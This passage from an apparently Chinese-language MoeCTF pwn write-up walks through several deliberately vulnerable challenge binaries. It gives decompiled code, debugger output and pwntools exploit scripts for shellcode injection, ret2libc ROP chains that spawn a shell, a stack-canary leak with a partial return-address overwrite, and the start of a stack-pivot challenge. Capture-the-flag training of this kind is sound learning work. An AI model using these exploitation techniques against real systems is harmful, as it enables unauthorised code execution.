n10 = getchar();</span><br><span class="line">  <span class="keyword">while</span> ( n10 != <span class="number">10</span> &amp;&amp; n10 != <span class="number">-1</span> );</span><br><span class="line">  <span class="keyword">if</span> ( n4 == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You can only make one change!&quot;</span>);</span><br><span class="line">    prot = <span class="number">7</span>;</span><br><span class="line">    v6 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( n4 &gt; <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">    <span class="keyword">switch</span> ( n4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;You can only make one change!&quot;</span>);</span><br><span class="line">        prot = <span class="number">4</span>;</span><br><span class="line">        v6 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;You can only make one change!&quot;</span>);</span><br><span class="line">        prot = <span class="number">1</span>;</span><br><span class="line">        v6 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;You can only make one change!&quot;</span>);</span><br><span class="line">        prot = <span class="number">3</span>;</span><br><span class="line">        v6 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">LABEL_24:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice. The space remains in its chaotic state.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( mprotect(s, <span class="number">0x1000u</span>LL, prot) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;mprotect&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nYou have now changed the permissions of the shellcode area.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;If you can&#x27;t input your shellcode, think about the permissions you just set.&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x1000u</span>LL);</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))s)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>观察到((void (*)(void))s)()，是一个可能可利用的shellcode</p>
<p>选择4给可读可写可执行权限，再利用shellcraft工具将sh写入s，程序就会将s的内容执行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io = start()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;I will give you some choices. Choose wisely!\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">io.recvuntil(<span class="string">b&quot;If you can&#x27;t input your shellcode, think about the permissions you just set.\n&quot;</span>)</span><br><span class="line">io.send(asm(shellcraft.sh()))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="prelibc">Prelibc</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setup(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The Oracle speaks...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There is no system function in the .text segment.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;A gift of forbidden knowledge, the location of &#x27;printf&#x27;: %p\n&quot;</span>, &amp;<span class="built_in">printf</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nNow, show me what you can do with this knowledge:&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>相较于Ret2text，没有了后门函数，需要我们字节构建system(“/bin/sh”)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = start()</span><br><span class="line">p.recvuntil(<span class="string">b&quot;A gift of forbidden knowledge, the location of &#x27;printf&#x27;: &quot;</span>)</span><br><span class="line">printf_bytes=p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">printf_addr_str = printf_bytes.strip().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">printf_addr = <span class="built_in">int</span>(printf_addr_str, <span class="number">16</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(printf_addr))</span><br><span class="line">libc_base=printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">pop_rdi_addr=libc_base+<span class="number">0x2a3e5</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x48</span>+p64(pop_rdi_addr+<span class="number">1</span>)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(sys_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>利用给的printf的地址，计算出libc的基地址，计算出“pop rdi;ret”、system与“/bin/sh”的地址</p>
<p>A*0x48覆盖buf和rbp，再利用pop_rdi_addr+1即是ret，用来防止栈没对齐，再执行pop rdi，将“/bin/sh”传入rdi中，返回system函数实现劫持</p>
<h3 id="easylibc">Easylibc</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What is this?\nHow can I use %p without a backdoor? Damn!\n&quot;</span>, &amp;read);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Something happening&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x60u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/ubuntu/Moectf/easylibc/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
<p>这题相较于Prelibc，关联到延迟绑定的内容</p>
<p>第一次输出时，输出的是一个还未使用过的函数read的地址，即是read的got表地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x45 bytes:</span><br><span class="line">    b<span class="string">&#x27;What is this?\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;How can I use 0x5a5e41533060 without a backdoor? Damn!\n&#x27;</span></span><br><span class="line">[+] <span class="built_in">read</span> got addr: 0x5a5e41533060</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line">Filtering out read-only entries (display them with -r or --show-readonly)</span><br><span class="line"></span><br><span class="line">State of the GOT of /home/ubuntu/Moectf/easylibc/pwn_patched:</span><br><span class="line">GOT protection: Partial RELRO | Found 4 GOT entries passing the filter</span><br><span class="line">[0x5a5e41536018] puts@GLIBC_2.2.5 -&gt; 0x5a5e41533030 ◂— endbr64</span><br><span class="line">[0x5a5e41536020] setbuf@GLIBC_2.2.5 -&gt; 0x7dae4ee87fe0 (setbuf) ◂— endbr64</span><br><span class="line">[0x5a5e41536028] <span class="built_in">printf</span>@GLIBC_2.2.5 -&gt; 0x7dae4ee606f0 (<span class="built_in">printf</span>) ◂— endbr64</span><br><span class="line">[0x5a5e41536030] <span class="built_in">read</span>@GLIBC_2.2.5 -&gt; 0x5a5e41533060 ◂— endbr64</span><br></pre></td></tr></table></figure>
<p>我们可以利用该地址算出main函数的地址，利用Ret2text使程序重新执行main函数</p>
<p>第二次输出时输出的就是read的真实地址，此时我们就可以利用Ret2libc劫持</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x45 bytes:</span><br><span class="line">    b<span class="string">&#x27;What is this?\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;How can I use 0x7dae4ef147d0 without a backdoor? Damn!\n&#x27;</span></span><br><span class="line">[+] <span class="built_in">read</span> addr: 0x7dae4ef147d0</span><br><span class="line">[+] libc_base addr: 0x7dae4ee00000</span><br><span class="line">[+] system addr: 0x7dae4ee50d70</span><br><span class="line">[+] bin addr: 0x7dae4efd8678</span><br><span class="line">[+] rdi addr: 0x7dae4ee2a3e5</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line">Filtering out read-only entries (display them with -r or --show-readonly)</span><br><span class="line"></span><br><span class="line">State of the GOT of /home/ubuntu/Moectf/easylibc/pwn_patched:</span><br><span class="line">GOT protection: Partial RELRO | Found 4 GOT entries passing the filter</span><br><span class="line">[0x5a5e41536018] puts@GLIBC_2.2.5 -&gt; 0x5a5e41533030 ◂— endbr64</span><br><span class="line">[0x5a5e41536020] setbuf@GLIBC_2.2.5 -&gt; 0x7dae4ee87fe0 (setbuf) ◂— endbr64</span><br><span class="line">[0x5a5e41536028] <span class="built_in">printf</span>@GLIBC_2.2.5 -&gt; 0x7dae4ee606f0 (<span class="built_in">printf</span>) ◂— endbr64</span><br><span class="line">[0x5a5e41536030] <span class="built_in">read</span>@GLIBC_2.2.5 -&gt; 0x7dae4ef147d0 (<span class="built_in">read</span>) ◂— endbr64</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = start()</span><br><span class="line">p.recvuntil(<span class="string">b&quot;What is this?\nHow can I use &quot;</span>)</span><br><span class="line">got_addr_hex_bytes = p.recvuntil(<span class="string">b&#x27; &#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">read_got_addr = <span class="built_in">int</span>(got_addr_hex_bytes.decode(), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;read got addr: %s&quot;</span>,<span class="built_in">hex</span>(read_got_addr))</span><br><span class="line"></span><br><span class="line">main_base=read_got_addr-elf.sym[<span class="string">&quot;read&quot;</span>]+elf.sym[<span class="string">&quot;main&quot;</span>]+<span class="number">0x54</span>+<span class="number">0x5</span></span><br><span class="line">payload0=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span>+p64(main_base)</span><br><span class="line">p.send(payload0)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;What is this?\nHow can I use &quot;</span>)</span><br><span class="line">addr_hex_bytes = p.recvuntil(<span class="string">b&#x27; &#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">read_addr = <span class="built_in">int</span>(addr_hex_bytes.decode(), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;read addr: %s&quot;</span>,<span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line">libc_base=read_addr-libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">sys_addr=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_addr=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">pop_rdi_addr=libc_base+<span class="number">0x2a3e5</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base addr: %s&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.success(<span class="string">&quot;system addr: %s&quot;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line">log.success(<span class="string">&quot;bin addr: %s&quot;</span>,<span class="built_in">hex</span>(bin_addr))</span><br><span class="line">log.success(<span class="string">&quot;rdi addr: %s&quot;</span>,<span class="built_in">hex</span>(pop_rdi_addr))</span><br><span class="line">p.recvuntil(<span class="string">b&quot;without a backdoor? Damn!\n&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi_addr+<span class="number">1</span>)+p64(pop_rdi_addr)+p64(bin_addr)+p64(sys_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ezcanary">Ezcanary</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setup(argc, argv, envp);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aThisTimeIWon);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Here is a beautiful canary, and it will be watching over you.&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x2Au</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Go ahead and overflow, anyway I have a canary.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I will give you a second chance, since you can not do anything anyway.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aEvenIfYouKillT);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x2Au</span>LL);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于有canary保护的该程序，多输入一字节将canary的00覆盖，这样在puts(buf)是就会将canary的其余七字节泄露出，这样就绕过了canary保护</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000001229                 public backdoor</span><br><span class="line">.text:0000000000001229 backdoor        proc near</span><br><span class="line">.text:0000000000001229</span><br><span class="line">.text:0000000000001229 buf             = qword ptr -10h</span><br><span class="line">.text:0000000000001229 var_8           = qword ptr -8</span><br><span class="line">.text:0000000000001229</span><br><span class="line">.text:0000000000001229 ; __unwind &#123;</span><br><span class="line">.text:0000000000001229                 endbr64</span><br><span class="line">.text:000000000000122D                 push    rbp</span><br><span class="line">.text:000000000000122E                 mov     rbp, rsp</span><br><span class="line">.text:0000000000001231                 sub     rsp, 10h</span><br><span class="line">.text:0000000000001235                 mov     rax, fs:28h</span><br><span class="line">.text:000000000000123E                 mov     [rbp+var_8], rax</span><br><span class="line">.text:0000000000001242                 xor     eax, eax</span><br><span class="line">.text:0000000000001244                 lea     rax, s          ; &quot;Give me the password!&quot;</span><br><span class="line">.text:000000000000124B                 mov     rdi, rax        ; s</span><br><span class="line">.text:000000000000124E                 call    _puts</span><br><span class="line">.text:0000000000001253                 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000001257                 mov     edx, 8          ; nbytes</span><br><span class="line">.text:000000000000125C                 mov     rsi, rax        ; buf</span><br><span class="line">.text:000000000000125F                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000001264                 call    _read</span><br><span class="line">.text:0000000000001269                 mov     rdx, [rbp+buf]</span><br><span class="line">.text:000000000000126D                 mov     rax, cs:password</span><br><span class="line">.text:0000000000001274                 cmp     rdx, rax</span><br><span class="line">.text:0000000000001277                 jnz     loc_1311</span><br><span class="line">.text:000000000000127D                 lea     rax, aYouFindTheSecr ; &quot;You find the secret:&quot;</span><br><span class="line">.text:0000000000001284                 mov     rdi, rax        ; s</span><br><span class="line">.text:0000000000001287                 call    _puts</span><br><span class="line">.text:000000000000128C                 mov     esi, 0          ; oflag</span><br><span class="line">.text:0000000000001291                 lea     rax, file       ; &quot;/flag&quot;</span><br><span class="line">.text:0000000000001298                 mov     rdi, rax        ; file</span><br><span class="line">.text:000000000000129B                 mov     eax, 0</span><br><span class="line">.text:00000000000012A0                 call    _open</span><br><span class="line">.text:00000000000012A5                 mov     cs:fd, eax</span><br><span class="line">.text:00000000000012AB                 mov     eax, cs:fd</span><br><span class="line">.text:00000000000012B1                 cmp     eax, 0FFFFFFFFh</span><br><span class="line">.text:00000000000012B4                 jnz     short loc_12CF</span><br><span class="line">.text:00000000000012B6                 lea     rax, aFailedToOpenFl ; &quot;Failed to open flag file.&quot;</span><br><span class="line">.text:00000000000012BD                 mov     rdi, rax        ; s</span><br><span class="line">.text:00000000000012C0                 call    _puts</span><br><span class="line">.text:00000000000012C5                 mov     edi, 1          ; status</span><br><span class="line">.text:00000000000012CA                 call    _exit</span><br><span class="line">.text:00000000000012CF ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000012CF</span><br><span class="line">.text:00000000000012CF loc_12CF:                               ; CODE XREF: backdoor+8B↑j</span><br><span class="line">.text:00000000000012CF                 mov     eax, cs:fd</span><br><span class="line">.text:00000000000012D5                 mov     edx, 64h ; &#x27;d&#x27;  ; nbytes</span><br><span class="line">.text:00000000000012DA                 lea     rcx, flag</span><br><span class="line">.text:00000000000012E1                 mov     rsi, rcx        ; buf</span><br><span class="line">.text:00000000000012E4                 mov     edi, eax        ; fd</span><br><span class="line">.text:00000000000012E6                 call    _read</span><br><span class="line">.text:00000000000012EB                 mov     edx, 64h ; &#x27;d&#x27;  ; n</span><br><span class="line">.text:00000000000012F0                 lea     rax, flag</span><br><span class="line">.text:00000000000012F7                 mov     rsi, rax        ; buf</span><br><span class="line">.text:00000000000012FA                 mov     edi, 1          ; fd</span><br><span class="line">.text:00000000000012FF                 call    _write</span><br><span class="line">.text:0000000000001304                 mov     eax, cs:fd</span><br><span class="line">.text:000000000000130A                 mov     edi, eax        ; fd</span><br><span class="line">.text:000000000000130C                 call    _close</span><br><span class="line">.text:0000000000001311</span><br><span class="line">.text:0000000000001311 loc_1311:                               ; CODE XREF: backdoor+4E↑j</span><br><span class="line">.text:0000000000001311                 mov     edi, 0          ; status</span><br><span class="line">.text:0000000000001316                 call    _exit</span><br><span class="line">.text:0000000000001316 ; &#125; // starts at 1229</span><br><span class="line">.text:0000000000001316 backdoor        endp</span><br></pre></td></tr></table></figure>
<p>此外还有PIE保护和后门函数，我们还可以覆盖返回地址的两个字节</p>
<p>对于开启PIE保护的程序，后三位地址是固定的，所以我们只需要从028c、128c、…、f28c中选一个进行爆破，有<span class="math inline">$\frac{1}{16}$</span>的概率成功</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = start()</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Here is a beautiful canary, and it will be watching over you.\n&quot;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x19</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x19</span>)</span><br><span class="line">canary_leak = p.recvn(<span class="number">7</span>)</span><br><span class="line">canary_bytes = <span class="string">b&#x27;\x00&#x27;</span>+canary_leak</span><br><span class="line">canary = u64(canary_bytes)</span><br><span class="line">log.success(<span class="string">f&quot;完整 canary(8 字节): 0x<span class="subst">&#123;canary:016x&#125;</span>&quot;</span>)</span><br><span class="line">payload2 = <span class="number">0x18</span>*<span class="string">b&quot;a&quot;</span>+p64(canary)+p64(<span class="number">0xaaaaaaaa</span>)+<span class="string">b&quot;\x8c\x52&quot;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ezpivot">Ezpivot</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/ubuntu/Moectf/ezpivot/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n32; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  _BYTE buf[<span class="number">12</span>]; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to join this pwn party!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please say something to introduce yourself:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Before that,you need to tell us the length of your introduction.&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n32);</span><br><span class="line">  <span class="keyword">if</span> ( n32 &gt; <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your introduction is too long, please try again.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  introduce((<span class="type">unsigned</span> <span class="type">int</span>)n32);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now, please tell us your phone number:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, len_of_phonenum);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里存在由int到unsigned int的强制转换，输入-1就能使（unsigned int)n32达到非常大的值</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">introduce</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> nbytes)</span></span><br><span class="line">&#123;</span><br><span class="line">  read(<span class="number">0</span>, &amp;desc, nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Ok,we got your introduction!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.bss:0000000000404060                 public desc</span><br><span class="line">.bss:0000000000404060 desc            db    ? ;               ; DATA XREF: introduce+15↑o</span><br><span class="line">.bss:0000000000404061                 db    ? ;</span><br><span class="line">...</span><br><span class="line">.bss:000000000040485F                 db    ? ;</span><br><span class="line">.bss:000000000040485F _bss            ends</span><br><span class="line">.bss:000000000040485F</span><br></pre></td></tr></table></figure>
<p>desc在bss段上，可以任意写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:0000000000404010                 public len_of_phonenum</span><br><span class="line">.data:0000000000404010 len_of_phonenum dd 1Ch                  ; DATA XREF: main+E8↑r</span><br><span class="line">.data:0000000000404010 _data           ends</span><br></pre></td></tr></table></figure>
<p>栈上只能覆盖rbp和返回地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000401211 ; void magic()</span><br><span class="line">.text:0000000000401211                 public magic</span><br><span class="line">.text:0000000000401211 magic           proc near</span><br><span class="line">.text:0000000000401211 ; __unwind &#123;</span><br><span class="line">.text:0000000000401211                 endbr64</span><br><span class="line">.text:0000000000401215                 push    rbp</span><br><span class="line">.text:0000000000401216                 mov     rbp, rsp</span><br><span class="line">.text:0000000000401219                 pop     rdi</span><br><span class="line">.text:000000000040121A                 retn</span><br><span class="line">.text:000000000040121A magic           endp</span><br><span class="line">.text:000000000040121A</span><br><span class="line">.text:000000000040121A ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040121B                 align 4</span><br><span class="line">.text:000000000040121C                 pop     rbp</span><br><span class="line">.text:000000000040121D                 retn</span><br><span class="line">.text:000000000040121D ; &#125; // starts at 401211</span><br><span class="line">.text:000000000040121E</span><br><span class="line">.text:000000000040121E ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:000000000040121E</span><br><span class="line">.text:000000000040121E ; Attributes: bp-based frame</span><br><span class="line">.text:000000000040121E</span><br><span class="line">.text:000000000040121E                 public backdoor</span><br><span class="line">.text:000000000040121E backdoor        proc near</span><br><span class="line">.text:000000000040121E ; __unwind &#123;</span><br><span class="line">.text:000000000040121E                 endbr64</span><br><span class="line">.text:0000000000401222                 push    rbp</span><br><span class="line">.text:0000000000401223                 mov     rbp, rsp</span><br><span class="line">.text:0000000000401226                 lea     rax, command    ; &quot;echo moectf&#123;WowYouGetTheFlag&#125;&quot;</span><br><span class="line">.text:000000000040122D                 mov     rdi, rax        ; command</span><br><span class="line">.text:0000000000401230                 call    _system</span><br><span class="line">.text:0000000000401235                 pop     rbp</span><br><span class="line">.text:0000000000401236                 retn</span><br><span class="line">.text:0000000000401236 ; &#125; // starts at 40121E</span><br><span class="line">.text:0000000000401236 backdoor        endp</span><br></pre></td></tr></table></figure>
<p>没有直接system返回地址可以用，需要我们构造pop rdi-&gt;binsh_addr-&gt;retn-&gt;system但是溢出字节不够，需要栈迁移</p>
